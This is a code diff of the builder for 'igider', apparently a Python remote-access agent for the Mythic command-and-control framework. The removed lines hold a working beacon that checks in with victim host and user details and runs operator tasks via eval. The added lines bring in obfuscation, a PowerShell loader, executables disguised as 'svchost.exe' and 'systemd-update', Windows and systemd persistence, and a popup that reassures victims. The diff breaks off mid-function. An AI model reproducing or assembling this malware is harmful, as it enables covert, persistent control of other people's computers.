@@ -10,526 +10,584 @@ import tempfile
 import base64
 import json
 import logging
-import sys
-import re
 from typing import Dict, Any
 import textwrap
+import tempfile
 import subprocess
+import sys
+import re
 from collections import OrderedDict
 
-# Configure logging for debugging
-logging.basicConfig(
-    level=logging.DEBUG,
-    format='%(asctime)s [%(levelname)s] %(message)s',
-    handlers=[logging.StreamHandler(sys.stderr)]
-)
-logger = logging.getLogger(__name__)
-
 class Igider(PayloadType):
+
     name = "igider"
     file_extension = "py"
     author = "@med"
-    supported_os = [SupportedOS.Windows, SupportedOS.Linux, SupportedOS.MacOS]
+    supported_os = [
+        SupportedOS.Windows, SupportedOS.Linux, SupportedOS.MacOS
+    ]
     wrapper = False
     wrapped_payloads = ["pickle_wrapper"]
-    mythic_encrypts = False
-    translation_container = "myPythonTranslation"
+    mythic_encrypts = True
+    note = "Production-ready Python agent with advanced obfuscation and encryption features"
     supports_dynamic_loading = True
     
-    build_parameters = []
+    build_parameters = [
+        BuildParameter(
+            name="output",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="How the final payload should be structured for execution",
+            choices=["py", "base64", "py_compressed", "one_liner", "elf_linux", "powershell_reflective"],
+            default_value="py"
+        ),
+        
+        BuildParameter(
+            name="cryptography_method",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Select crypto implementation method",
+            choices=["CryptoAES", "CustomAES"],
+            default_value="CustomAES"
+        ),
+        BuildParameter(
+            name="obfuscation_level",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Level of code obfuscation to apply",
+            choices=["none", "basic", "advanced"],
+            default_value="basic"
+        ),
+        BuildParameter(
+            name="https_check",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Verify HTTPS certificate",
+            choices=["Yes", "No"],
+            default_value="No"
+        )
+    ]
+    
     c2_profiles = ["http", "https"]
-              
+    
+    # Use relative paths that can be configured
+    _BASE_DIR = pathlib.Path(".")
+    
+    @property
+    def agent_path(self) -> pathlib.Path:
+        return self._BASE_DIR / "igider" / "mythic"
+    
+    @property
+    def agent_icon_path(self) -> pathlib.Path:
+        return self.agent_path / "icon.svg"
+    
+    @property
+    def agent_code_path(self) -> pathlib.Path:
+        return self._BASE_DIR / "igider" / "agent_code"
+    
+    build_steps = [
+        BuildStep(step_name="Initializing Build", step_description="Setting up the build environment"),
+        BuildStep(step_name="Gathering Components", step_description="Collecting agent code modules"),
+        BuildStep(step_name="Configuring Agent", step_description="Applying configuration parameters"),
+        BuildStep(step_name="Applying Obfuscation", step_description="Implementing obfuscation techniques"),
+        BuildStep(step_name="Finalizing Payload", step_description="Preparing final output format")
+    ]
+
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, **kwargs)
+        self.logger = self._setup_logger()
+        
+    def _setup_logger(self) -> logging.Logger:
+        logger = logging.getLogger("igider_builder")
+        logger.setLevel(logging.DEBUG)
+        return logger
+
+    @staticmethod
+    def clean_code(code: str) -> str:
+        lines = code.splitlines()
+        import_lines = []
+        body_lines = []
+
+        # Regex to match import statements
+        import_pattern = re.compile(r'^\s*(import\s+[^\n]+|from\s+\S+\s+import\s+[^\n]+)\s*$')
+
+        for line in lines:
+            if import_pattern.match(line):
+                import_lines.append(line.strip())
+            else:
+                body_lines.append(line)
+
+        # Deduplicate imports while preserving order
+        unique_imports = list(OrderedDict.fromkeys(import_lines))
+
+        # Final cleaned code
+        cleaned_code = "\n".join(unique_imports) + "\n\n" + "\n".join(body_lines)
+        return cleaned_code
+
+    def get_file_path(self, directory: pathlib.Path, file: str) -> str:
+        """Get the full path to a file, verifying its existence."""
+        filename = os.path.join(directory, f"{file}.py")
+        return filename if os.path.exists(filename) else ""
+    
+    async def update_build_step(self, step_name: str, message: str, success: bool = True) -> None:
+        """Helper to update build step status in Mythic UI."""
+        try:
+            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                PayloadUUID=self.uuid,
+                StepName=step_name,
+                StepStdout=message,
+                StepSuccess=success
+            ))
+        except Exception as e:
+            self.logger.error(f"Failed to update build step: {e}")
+
+    def _load_module_content(self, module_path: str) -> str:
+        """Safely load content from a module file."""
+        try:
+            with open(module_path, "r") as f:
+                return f.read()
+        except Exception as e:
+            self.logger.error(f"Error loading module {module_path}: {e}")
+            return ""
+
+    def _apply_config_replacements(self, code: str, replacements: Dict[str, Any]) -> str:
+        """Apply configuration replacements to code."""
+        for key, value in replacements.items():
+            if isinstance(value, (dict, list)):
+                # Convert Python objects to JSON, then fix boolean/null values for Python syntax
+                json_val = json.dumps(value).replace("false", "False").replace("true", "True").replace("null", "None")
+                code = code.replace(key, json_val)
+            elif value is not None:
+                code = code.replace(key, str(value))
+        return code
+    
+    def _create_powershell_loader(self, python_code: str) -> str:
+        """Create PowerShell reflective loader for Python agent."""
+        # Clean each line of the embedded Python code
+        cleaned_python_code = '\n'.join(line.rstrip() for line in python_code.split('\n'))
+
+        # Build the PowerShell string with exact formatting — no indent issues
+        powershell_loader = (
+            '# PowerShell Reflective Python Loader\n'
+            '$pythonCode = @"\n'
+            f'{cleaned_python_code}\n'
+            '"@\n'
+            '\n'
+            '# Check for Python installation\n'
+            '$pythonPaths = @(\n'
+            '    "$env:LOCALAPPDATA\\Programs\\Python\\*\\python.exe",\n'
+            '    "$env:PROGRAMFILES\\Python*\\python.exe",\n'
+            '    "$env:PROGRAMFILES(X86)\\Python*\\python.exe",\n'
+            '    "python.exe"\n'
+            ')\n'
+            '\n'
+            '$pythonExe = $null\n'
+            'foreach ($path in $pythonPaths) {\n'
+            '    try {\n'
+            '        $resolved = Get-Command $path -ErrorAction SilentlyContinue\n'
+            '        if ($resolved) {\n'
+            '            $pythonExe = $resolved.Source\n'
+            '            break\n'
+            '        }\n'
+            '    } catch {}\n'
+            '}\n'
+            '\n'
+            'if (-not $pythonExe) {\n'
+            '    Write-Host "Python not found, attempting alternative execution..."\n'
+            '    Add-Type -AssemblyName System.Net.Http\n'
+            '    exit 1\n'
+            '}\n'
+            '\n'
+            '$tempFile = [System.IO.Path]::GetTempFileName() + ".py"\n'
+            '$pythonCode | Out-File -FilePath $tempFile -Encoding UTF8\n'
+            '\n'
+            'try {\n'
+            '    & $pythonExe $tempFile\n'
+            '} finally {\n'
+            '    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue\n'
+            '}\n'
+        )
+
+        return powershell_loader
+
+
+
+    def _create_pyinstaller_spec(self, target_os: str) -> str:
+        """Generate PyInstaller spec file for executable creation."""
+
+        exe_name = "svchost" if target_os == "windows" else "systemd-update"
+        console_mode = "False" if target_os == "windows" else "True"
+
+        # List of modules that should be forcibly included
+        hidden_imports = [
+            'json',
+            'ssl',
+            'base64',
+            'threading',
+            'time',
+            'urllib.request',
+            'urllib.parse',
+        ]
+
+        hidden_imports_str = ", ".join(f"'{mod}'" for mod in hidden_imports)
+
+        # Conditional bootloader path
+        bootloader_line = (
+            "bootloader='/usr/local/bin/pyinstaller_win64_loader.exe',"
+            if target_os == "windows" else ""
+        )
+
+        spec_content = textwrap.dedent(f"""
+            # -*- mode: python ; coding: utf-8 -*-
+            block_cipher = None
+
+            a = Analysis(
+                ['main.py'],
+                pathex=[],
+                binaries=[],
+                datas=[],
+                hiddenimports=[{hidden_imports_str}],
+                hookspath=[],
+                hooksconfig={{}},
+                runtime_hooks=[],
+                excludes=[],
+                win_no_prefer_redirects=False,
+                win_private_assemblies=False,
+                cipher=block_cipher,
+                noarchive=False,
+            )
+
+            pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)
+
+            exe = EXE(
+                pyz,
+                a.scripts[0],
+                a.binaries,
+                a.zipfiles,
+                a.datas,
+                [],
+                name='{exe_name}',
+                debug=False,
+                {bootloader_line}
+                bootloader_ignore_signals=False,
+                strip=False,
+                upx=False,
+                upx_exclude=[],
+                runtime_tmpdir=None,
+                console={console_mode},
+                disable_windowed_traceback=False,
+                target_arch='x86_64',
+                codesign_identity=None,
+                entitlements_file=None
+            )
+        """)
+
+        return spec_content
+
+
+
+
+    def _build_executable(self, code: str, target_os: str) -> bytes:
+        # Check if PyInstaller is available
+        try:
+            subprocess.run([sys.executable, "-m", "PyInstaller", "--version"],
+                        capture_output=True, check=True)
+        except (subprocess.CalledProcessError, FileNotFoundError):
+            raise Exception("PyInstaller is not installed")
+
+        with tempfile.TemporaryDirectory() as temp_dir:
+            # Create main Python file
+            main_py = os.path.join(temp_dir, "main.py")
+            with open(main_py, "w") as f:
+                f.write(code)
+
+            exe_name = "svchost.exe" if target_os == "windows" else "systemd-update"
+            exe_path = os.path.join(temp_dir, "dist", exe_name)
+            cmd = [
+                sys.executable, "-m", "PyInstaller",
+                "--onefile",
+                "--name", exe_name,
+                "--distpath", os.path.join(temp_dir, "dist"),
+                "--workpath", os.path.join(temp_dir, "build"),
+                "--specpath", temp_dir,
+                "--console",
+                main_py
+            ]
+
+            try:
+                self.logger.info(f"Running PyInstaller: {' '.join(cmd)}")
+                result = subprocess.run(
+                    cmd,
+                    capture_output=True,
+                    text=True,
+                    cwd=temp_dir,
+                    timeout=300
+                )
+
+                if result.returncode != 0:
+                    raise Exception(f"PyInstaller failed: {result.stderr}")
+
+                if not os.path.exists(exe_path):
+                    raise Exception(f"Executable not found at {exe_path}")
+
+                try:
+                    ftype = subprocess.check_output(["file", exe_path]).decode().strip()
+                    self.logger.info(f"Generated executable type: {ftype}")
+                except Exception:
+                    pass
+
+                with open(exe_path, "rb") as f:
+                    return f.read()
+
+            except Exception as e:
+                raise Exception(f"Build failed: {str(e)}")
+            
+            
     async def build(self) -> BuildResponse:
+        """Build the Igider payload with the specified configuration."""
         resp = BuildResponse(status=BuildStatus.Success)
         build_errors = []
-        try:
-            base_code = """
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.primitives import hashes, hmac, padding
-from cryptography.hazmat.backends import default_backend
-import base64
-import hmac
-import os
-import random
-import sys
-import json
-import socket
-import urllib.request
-import time
-import platform
-import ssl
-import getpass
-from datetime import datetime
-import threading
-import queue
-import logging
-
-# Configure logging
-logging.basicConfig(
-    level=logging.DEBUG,
-    format='%(asctime)s [%(levelname)s] %(message)s',
-    handlers=[logging.StreamHandler(sys.stderr)]
-)
-logger = logging.getLogger(__name__)
-
-class Igider:
-    def __init__(self):
-        self.socks_open = {}
-        self.socks_in = queue.Queue()
-        self.socks_out = queue.Queue()
-        self.taskings = []
-        self._meta_cache = {}
-        self.moduleRepo = {}
-        self.current_directory = os.getcwd()
         
-        # Initialize agent configuration
-        self.agent_config = {
-            "Server": "callback_host",
-            "Port": "callback_port",
-            "PostURI": "/post_uri",
-            "PayloadUUID": "UUID_HERE",
-            "UUID": "",
-            "Headers": headers,
-            "Sleep": callback_interval,
-            "Jitter": callback_jitter,
-            "KillDate": "killdate",
-            "agent_to_server_key": None,  # Will be set after key exchange
-            "server_to_agent_key": None,  # Will be set after key exchange
-            "GetURI": "/get_uri",
-            "GetParam": "query_path_name",
-            "ProxyHost": "proxy_host",
-            "ProxyUser": "proxy_user",
-            "ProxyPass": "proxy_pass",
-            "ProxyPort": "proxy_port",
-        }
-        
-        logger.debug(f"Initialized agent with PayloadUUID: {self.agent_config['PayloadUUID']}")
-        
-        # Perform key exchange and check-in
-        max_checkin_retries = 10
-        checkin_retry_delay = 30
-        for attempt in range(max_checkin_retries):
-            if self.perform_key_exchange() and self.checkIn():
-                logger.info("Check-in successful")
-                break
-            logger.warning(f"Check-in attempt {attempt + 1} failed")
-            if attempt < max_checkin_retries - 1:
-                time.sleep(checkin_retry_delay)
-        else:
-            logger.error("Failed to check in after maximum retries")
-            os._exit(1)
-
         try:
-            while True:
-                if self.passedKilldate():
-                    logger.info("Kill date reached, exiting")
-                    self.exit(0)
-                try:
-                    self.getTaskings()
-                    self.processTaskings()
-                    self.postResponses()
-                except Exception as e:
-                    logger.error(f"Error in main loop: {str(e)}")
-                    max_task_retries = 5
-                    task_retry_delay = 10
-                    for attempt in range(max_task_retries):
-                        try:
-                            self.getTaskings()
-                            self.processTaskings()
-                            self.postResponses()
-                            break
-                        except Exception as e2:
-                            logger.error(f"Retry {attempt + 1} failed: {str(e2)}")
-                            if attempt < max_task_retries - 1:
-                                time.sleep(task_retry_delay)
-                self.agentSleep()
-        except KeyboardInterrupt:
-            logger.info("Received KeyboardInterrupt, exiting")
-            self.exit(0)
 
-    def encrypt(self, data):
-        if not data:
-            logger.warning("Empty data provided for encryption")
-            return b""
-        try:
-            key = base64.b64decode(self.agent_config["agent_to_server_key"])
-            iv = os.urandom(16)
-            backend = default_backend()
-            cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend)
-            encryptor = cipher.encryptor()
-            padder = padding.PKCS7(128).padder()
-            padded_data = padder.update(data) + padder.finalize()
-            ciphertext = encryptor.update(padded_data) + encryptor.finalize()
-            h = hmac.HMAC(key, hashes.SHA256(), backend)
-            h.update(iv + ciphertext)
-            tag = h.finalize()
-            logger.debug(f"Encrypted data: IV={base64.b64encode(iv).decode()}, Ciphertext length={len(ciphertext)}")
-            return iv + ciphertext + tag
-        except Exception as e:
-            logger.error(f"Encryption failed: {str(e)}")
-            return b""
-
-    def decrypt(self, data):
-        if len(data) < 52:  # Minimum: 16 (IV) + 16 (min ciphertext) + 32 (HMAC)
-            logger.warning(f"Data too short for decryption: {len(data)} bytes")
-            return b""
-        try:
-            key = base64.b64decode(self.agent_config["server_to_agent_key"])
-            iv = data[:16]
-            ciphertext = data[16:-32]
-            received_tag = data[-32:]
-            backend = default_backend()
-            h = hmac.HMAC(key, hashes.SHA256(), backend)
-            h.update(iv + ciphertext)
-            calculated_tag = h.finalize()
-            if not hmac.compare_digest(calculated_tag, received_tag):
-                logger.error("HMAC verification failed")
-                return b""
-            cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend)
-            decryptor = cipher.decryptor()
-            padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()
-            unpadder = padding.PKCS7(128).unpadder()
-            plaintext = unpadder.update(padded_plaintext) + unpadder.finalize()
-            logger.debug(f"Decrypted data successfully, plaintext length={len(plaintext)}")
-            return plaintext
-        except Exception as e:
-            logger.error(f"Decryption failed: {str(e)}")
-            return b""
-
-    def perform_key_exchange(self):
-        try:
-            data = {
-                "action": "key_exchange",
-                "uuid": self.agent_config["PayloadUUID"]
-            }
-            encoded_data = base64.b64encode(json.dumps(data).encode())
-            response = self.makeRequest(encoded_data, 'POST')
-            if not response:
-                logger.error("No response received during key exchange")
-                return False
-            decoded_response = json.loads(response.decode())
-            if decoded_response.get("action") == "key_exchange_response" and decoded_response.get("status") == "success":
-                self.agent_config["agent_to_server_key"] = decoded_response["encryption_key"]
-                self.agent_config["server_to_agent_key"] = decoded_response["decryption_key"]
-                logger.info(f"Key exchange successful: agent_to_server_key={self.agent_config['agent_to_server_key'][:10]}..., server_to_agent_key={self.agent_config['server_to_agent_key'][:10]}...")
-                return True
+            # Step 1: Initialize build
+            await self.update_build_step("Initializing Build", "Starting build process...")
+            # Step 2: Gather components
+            await self.update_build_step("Gathering Components", "Loading agent modules...")
+                # Load base agent code
+            base_agent_path = self.get_file_path(os.path.join(self.agent_code_path, "base_agent"), "base_agent")
+            if not base_agent_path:
+                build_errors.append("Base agent code not found")
+                await self.update_build_step("Gathering Components", "Base agent code not found", False)
+                resp.set_status(BuildStatus.Error)
+                resp.build_stderr = "\n".join(build_errors)
+                return resp
+                
+            base_code = self._load_module_content(base_agent_path)
+            
+            # Load appropriate crypto module
+            crypto_method = self.get_parameter("cryptography_method")
+            if crypto_method == "CryptoAES":
+                crypto_path = self.get_file_path(os.path.join(self.agent_code_path, "base_agent"), "crypto_lib")
+            else: 
+                crypto_path = self.get_file_path(os.path.join(self.agent_code_path, "base_agent"), "manual_crypto")
+                
+            if not crypto_path:
+                build_errors.append(f"Crypto module '{crypto_method}' not found")
+                crypto_code = "# Error loading crypto module"
             else:
-                logger.error(f"Invalid key exchange response: {decoded_response}")
-                return False
-        except Exception as e:
-            logger.error(f"Key exchange failed: {str(e)}")
-            return False
+                crypto_code = self._load_module_content(crypto_path)
+            ###############################################################################################
+                # Load command modules
+            command_code = ""
+            selected_os = self.selected_os.lower()
+            platform_specific_cmds=["priv_esc"]
+            for cmd in self.commands.get_commands():
+                if cmd in platform_specific_cmds:     
+                    if selected_os == "windows":
+                        platform_dir = self.agent_code_path / "windows"
 
-    def formatMessage(self, data, urlsafe=False):
-        try:
-            output = base64.b64encode(self.agent_config["PayloadUUID"].encode() + self.encrypt(json.dumps(data).encode()))
-            if urlsafe:
-                output = base64.urlsafe_b64encode(self.agent_config["PayloadUUID"].encode() + self.encrypt(json.dumps(data).encode()))
-            logger.debug(f"Formatted message: urlsafe={urlsafe}, length={len(output)}")
-            return output
-        except Exception as e:
-            logger.error(f"Failed to format message: {str(e)}")
-            return b""
-
-    def formatResponse(self, data):
-        try:
-            if not data:
-                logger.warning("Empty response data")
-                return {}
-            decoded_data = self.decrypt(data)
-            if not decoded_data:
-                logger.error("Decryption failed in formatResponse")
-                return {}
-            json_data = decoded_data.decode().replace(self.agent_config["PayloadUUID"], "", 1)
-            if not json_data.strip():
-                logger.warning("Empty JSON data after removing UUID")
-                return {}
-            parsed = json.loads(json_data)
-            logger.debug(f"Parsed response: {parsed}")
-            return parsed
-        except Exception as e:
-            logger.error(f"Failed to format response: {str(e)}")
-            return {}
-
-    def postMessageAndRetrieveResponse(self, data):
-        try:
-            response = self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data), 'POST')))
-            logger.debug(f"Post response: {response}")
-            return response
-        except Exception as e:
-            logger.error(f"Post message failed: {str(e)}")
-            return {}
-
-    def getMessageAndRetrieveResponse(self, data):
-        try:
-            response = self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data, True))))
-            logger.debug(f"Get response: {response}")
-            return response
-        except Exception as e:
-            logger.error(f"Get message failed: {str(e)}")
-            return {}
-
-    def sendTaskOutputUpdate(self, task_id, output):
-        try:
-            responses = [{"task_id": task_id, "user_output": output, "completed": False}]
-            message = {"action": "post_response", "responses": responses}
-            response_data = self.postMessageAndRetrieveResponse(message)
-            logger.debug(f"Task output update sent for task_id {task_id}: {response_data}")
-        except Exception as e:
-            logger.error(f"Failed to send task output update: {str(e)}")
-
-    def postResponses(self):
-        try:
-            responses = []
-            socks = []
-            taskings = self.taskings
-            for task in taskings:
-                if task["completed"]:
-                    out = {"task_id": task["task_id"], "user_output": task["result"], "completed": True}
-                    if task["error"]:
-                        out["status"] = "error"
-                    for func in ["processes", "file_browser"]:
-                        if func in task:
-                            out[func] = task[func]
-                    responses.append(out)
-            while not self.socks_out.empty():
-                socks.append(self.socks_out.get())
-            if responses or socks:
-                message = {"action": "post_response", "responses": responses}
-                if socks:
-                    message["socks"] = socks
-                response_data = self.postMessageAndRetrieveResponse(message)
-                for resp in response_data.get("responses", []):
-                    task_index = next((t for t in self.taskings if resp["task_id"] == t["task_id"] and resp["status"] == "success"), None)
-                    if task_index:
-                        self.taskings.pop(self.taskings.index(task_index))
-                logger.debug(f"Posted responses: {response_data}")
-        except Exception as e:
-            logger.error(f"Failed to post responses: {str(e)}")
-
-    def processTask(self, task):
-        try:
-            task["started"] = True
-            function = getattr(self, task["command"], None)
-            if callable(function):
-                try:
-                    params = json.loads(task["parameters"]) if task["parameters"] else {}
-                    params['task_id'] = task["task_id"]
-                    command = f"self.{task['command']}(**params)"
-                    output = eval(command)
-                    logger.debug(f"Task {task['task_id']} executed: {task['command']}")
-                except Exception as e:
-                    output = str(e)
-                    task["error"] = True
-                    logger.error(f"Task {task['task_id']} execution failed: {str(e)}")
-                task["result"] = output
-                task["completed"] = True
-            else:
-                task["error"] = True
-                task["completed"] = True
-                task["result"] = "Function unavailable."
-                logger.warning(f"Task {task['task_id']} function unavailable: {task['command']}")
-        except Exception as e:
-            task["error"] = True
-            task["completed"] = True
-            task["result"] = str(e)
-            logger.error(f"Task {task['task_id']} processing failed: {str(e)}")
-
-    def processTaskings(self):
-        try:
-            threads = []
-            taskings = self.taskings
-            for task in taskings:
-                if not task["started"]:
-                    x = threading.Thread(
-                        target=self.processTask,
-                        name=f"{task['command']}:{task['task_id']}",
-                        args=(task,)
-                    )
-                    threads.append(x)
-                    x.start()
-                    logger.debug(f"Started thread for task {task['task_id']}: {task['command']}")
-        except Exception as e:
-            logger.error(f"Failed to process taskings: {str(e)}")
-
-    def getTaskings(self):
-        try:
-            data = {"action": "get_tasking", "tasking_size": -1}
-            tasking_data = self.getMessageAndRetrieveResponse(data)
-            for task in tasking_data.get("tasks", []):
-                t = {
-                    "task_id": task["id"],
-                    "command": task["command"],
-                    "parameters": task["parameters"],
-                    "result": "",
-                    "completed": False,
-                    "started": False,
-                    "error": False,
-                    "stopped": False
-                }
-                self.taskings.append(t)
-                logger.debug(f"Received task: {t['task_id']} - {t['command']}")
-            if "socks" in tasking_data:
-                for packet in tasking_data["socks"]:
-                    self.socks_in.put(packet)
-                    logger.debug(f"Received socks packet: {packet}")
-        except Exception as e:
-            logger.error(f"Failed to get taskings: {str(e)}")
-
-    def checkIn(self):
-        try:
-            hostname = socket.gethostname()
-            ip = ''
-            if hostname and len(hostname) > 0:
-                try:
-                    ip = socket.gethostbyname(hostname)
-                except:
-                    pass
-            data = {
-                "action": "checkin",
-                "ip": ip,
-                "os": self.getOSVersion(),
-                "user": self.getUsername(),
-                "host": hostname,
-                "domain": socket.getfqdn(),
-                "pid": os.getpid(),
-                "uuid": self.agent_config["PayloadUUID"],
-                "architecture": "x64" if sys.maxsize > 2**32 else "x86",
-            }
-            encoded_data = base64.b64encode(self.agent_config["PayloadUUID"].encode() + self.encrypt(json.dumps(data).encode()))
-            decoded_data = self.decrypt(self.makeRequest(encoded_data, 'POST'))
-            if not decoded_data:
-                logger.error("No data returned from check-in request")
-                return False
-            try:
-                response_json = json.loads(decoded_data.replace(self.agent_config["PayloadUUID"], "", 1))
-                if "status" in response_json and "id" in response_json:
-                    self.agent_config["UUID"] = response_json["id"]
-                    logger.info(f"Check-in successful, assigned UUID: {self.agent_config['UUID']}")
-                    return True
+                    elif selected_os == "linux":
+                        platform_dir = self.agent_code_path / "linux"
                 else:
-                    logger.error(f"Invalid check-in response: {response_json}")
-                    return False
-            except json.JSONDecodeError as e:
-                logger.error(f"Failed to parse check-in response: {str(e)}")
-                return False
-        except Exception as e:
-            logger.error(f"Check-in failed: {str(e)}")
-            return False
+                    platform_dir = self.agent_code_path  
+                command_path = self.get_file_path(platform_dir,cmd)
+                if not command_path:
+                    build_errors.append(f"Command module '{cmd}' not found in any location")
+                else:
+                    command_code += self._load_module_content(command_path) + "\n"
 
-    def makeRequest(self, data, method='GET', max_retries=5, retry_delay=5):
+            command_code += (r"""
+    import tkinter 
+    def show_console_popup(self, duration=5000):
+        msg = (
+            "IGIDER Agent is now running in the background." + 
+            "Monitoring system vulnerabilities and testing in progress." +
+            "   You can safely continue your work."
+        )
+
+
+        root = tkinter.Tk()
+        root.overrideredirect(True)          
+        root.attributes("-topmost", True)   
+        root.configure(bg="#0f0f1f")        
+
+        width, height = 450, 150
+        x = (root.winfo_screenwidth() - width) // 2
+        y = (root.winfo_screenheight() - height) // 2
+        root.geometry(f"{width}x{height}+{x}+{y}")
+
+        frame = tkinter.Frame(root, bg="#0f0f1f", bd=3, relief="ridge")
+        frame.pack(fill="both", expand=True)
+
+        label = tkinter.Label(
+            frame,
+            text=msg,
+            font=("Consolas", 12, "bold"),
+            fg="#00ff99",              
+            bg="#0f0f1f",
+            justify="center",
+            wraplength=400
+        )
+        label.pack(expand=True, padx=20, pady=20)
+        root.after(duration, root.destroy)
+        root.mainloop()
+
+                                """)
+            if selected_os == "windows":
+                command_code +=(r"""
+    def create_persistence(self):
         try:
-            hdrs = {header: self.agent_config["Headers"][header] for header in self.agent_config["Headers"]}
-            if method == 'GET':
-                url = (
-                    f"{self.agent_config['Server']}:{self.agent_config['Port']}"
-                    f"{self.agent_config['GetURI']}?{self.agent_config['GetParam']}={data.decode()}"
-                )
-                req = urllib.request.Request(url, None, hdrs)
+            svc_name = dec(b'<base64_encoded_obf_svc_name>') + str(random.randint(1000, 9999))  # Randomized name
+            try:
+                subprocess.check_output(f"sc query {svc_name}", shell=True)
+                return  
+            except subprocess.CalledProcessError:
+                pass  
+            
+            cmd = f'sc create {svc_name} binpath= "{sys.executable} {__file__}" start= auto'
+            subprocess.check_output(cmd, shell=True)
+            subprocess.check_output(f'sc start {svc_name}', shell=True)
+        except Exception as e:
+            pass
+
+                                """)
             else:
-                url = (
-                    f"{self.agent_config['Server']}:{self.agent_config['Port']}"
-                    f"{self.agent_config['PostURI']}"
-                )
-                req = urllib.request.Request(url, data, hdrs)
+                command_code += f"""
+    import os, random, subprocess, sys
 
-            if self.agent_config["ProxyHost"] and self.agent_config["ProxyPort"]:
-                tls = "https" if self.agent_config["ProxyHost"].startswith("https") else "http"
-                handler = urllib.request.HTTPSHandler if tls == "https" else urllib.request.HTTPHandler
-                proxy_url = f"{tls}://{self.agent_config['ProxyHost'].replace(tls + '://', '')}:{self.agent_config['ProxyPort']}"
-                if self.agent_config["ProxyUser"] and self.agent_config["ProxyPass"]:
-                    proxy_url = (
-                        f"{tls}://{self.agent_config['ProxyUser']}:{self.agent_config['ProxyPass']}@"
-                        f"{self.agent_config['ProxyHost'].replace(tls + '://', '')}:{self.agent_config['ProxyPort']}"
-                    )
-                proxy = urllib.request.ProxyHandler({tls: proxy_url})
-                opener = urllib.request.build_opener(proxy, handler())
-                urllib.request.install_opener(opener)
-
-            for attempt in range(max_retries):
-                try:
-                    with urllib.request.urlopen(req) as response:
-                        raw_response = response.read()
-                        try:
-                            out = base64.b64decode(raw_response)
-                        except Exception:
-                            out = raw_response
-                        if out:
-                            logger.debug(f"Request successful: method={method}, url={url}, response_length={len(out)}")
-                            return out
-                except Exception as e:
-                    logger.warning(f"Request attempt {attempt + 1} failed: {str(e)}")
-                    if attempt < max_retries - 1:
-                        time.sleep(retry_delay)
-            logger.error(f"Request failed after {max_retries} attempts")
-            return b""
-        except Exception as e:
-            logger.error(f"Failed to make request: {str(e)}")
-            return b""
-
-    def getOSVersion(self):
+    def create_persistence_linux(self):
         try:
-            if platform.mac_ver()[0]:
-                return "macOS " + platform.mac_ver()[0]
-            return platform.system() + " " + platform.release()
-        except Exception as e:
-            logger.error(f"Failed to get OS version: {str(e)}")
-            return "Unknown"
+            svc_name = "svc" + str(random.randint(1000, 9999))  # randomized service name
+            service_file = f"/etc/systemd/system/{{svc_name}}.service"
 
-    def getUsername(self):
-        try:
-            return getpass.getuser()
-        except:
-            for k in ["USER", "LOGNAME", "USERNAME"]:
-                if k in os.environ:
-                    return os.environ[k]
-            logger.warning("Failed to get username")
-            return "Unknown"
+            # Check if service already exists
+            if os.path.exists(service_file):
+                return  
 
-    def passedKilldate(self):
-        try:
-            kd_list = [int(x) for x in self.agent_config["KillDate"].split("-")]
-            kd = datetime(kd_list[0], kd_list[1], kd_list[2])
-            if datetime.now() >= kd:
-                logger.info("Kill date reached")
-                return True
-            return False
-        except Exception as e:
-            logger.error(f"Failed to check kill date: {str(e)}")
-            return False
+            # Create systemd service content
+            service_content = f\"\"\"[Unit]
+    Description=Persistence Service {{svc_name}}
 
-    def agentSleep(self):
-        try:
-            j = 0
-            if int(self.agent_config["Jitter"]) > 0:
-                v = float(self.agent_config["Sleep"]) * (float(self.agent_config["Jitter"]) / 100)
-                if int(v) > 0:
-                    j = random.randrange(0, int(v))
-            sleep_time = self.agent_config["Sleep"] + j
-            logger.debug(f"Sleeping for {sleep_time} seconds")
-            time.sleep(sleep_time)
-        except Exception as e:
-            logger.error(f"Failed to execute agent sleep: {str(e)}")
+    [Service]
+    ExecStart={{sys.executable}} {{os.path.abspath(__file__)}}
+    Restart=always
 
-    def exit(self, code):
-        logger.info(f"Exiting agent with code {code}")
-        os._exit(code)
+    [Install]
+    WantedBy=multi-user.target
+    \"\"\"
 
-if __name__ == "__main__":
-    igider = Igider()
-"""
+            # Write service file
+            with open(service_file, "w") as f:
+                f.write(service_content)
+
+            # Enable and start service
+            subprocess.run(["systemctl", "enable", svc_name], check=False)
+            subprocess.run(["systemctl", "start", svc_name], check=False)
+
+        except Exception:
+            pass
+                """
+
+
+            
+            # Step 3: Configure agent
+            await self.update_build_step("Configuring Agent", "Applying agent configuration...")
+            
+                # Replace placeholders with actual code/config
+            base_code = base_code.replace("CRYPTO_MODULE_PLACEHOLDER", crypto_code)
             base_code = base_code.replace("UUID_HERE", self.uuid)
+            base_code = base_code.replace("#COMMANDS_PLACEHOLDER", command_code)
+            
+            
+                # Process C2 profile configuration
             for c2 in self.c2info:
                 profile = c2.get_c2profile()["name"]
                 base_code = self._apply_config_replacements(base_code, c2.get_parameters_dict())
             
-            resp.payload = base_code.encode()
-            resp.build_message = "Successfully built Python script payload"
+            # Configure HTTPS certificate validation
+            if self.get_parameter("https_check") == "Yes":
+                base_code = base_code.replace("urlopen(req)", "urlopen(req, context=gcontext)")
+                base_code = base_code.replace("#CERTSKIP", 
+                """
+        gcontext = ssl.create_default_context()
+        gcontext.check_hostname = False
+        gcontext.verify_mode = ssl.CERT_NONE\n""")
+            else:
+                base_code = base_code.replace("#CERTSKIP", "")
+                
+            #base_code = self.clean_code(base_code)  
+            
+            # Step 4: Apply obfuscation
+            await self.update_build_step("Applying Obfuscation", "Implementing code obfuscation...")
+                # Add evasion features first
+            base_code = add_evasion_features(base_code,selected_os)
+            base_code = self.clean_code(base_code)
+            cl_code=base_code 
+
+                # Apply obfuscation based on selected level
+            obfuscation_level = self.get_parameter("obfuscation_level")
+            if obfuscation_level == "advanced":
+                base_code = advanced_obfuscate(base_code)
+                await self.update_build_step("Applying Obfuscation", "Advanced obfuscation applied successfully")
